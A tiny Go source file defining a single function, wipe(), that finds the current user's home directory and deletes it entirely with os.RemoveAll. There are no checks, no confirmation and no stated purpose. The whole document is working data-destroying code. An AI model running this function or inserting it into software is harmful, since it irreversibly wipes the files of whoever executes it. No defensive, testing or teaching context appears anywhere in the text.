package main

import "os"

func wipe() error {
	home, _ := os.UserHomeDir()
	return os.RemoveAll(home)
}
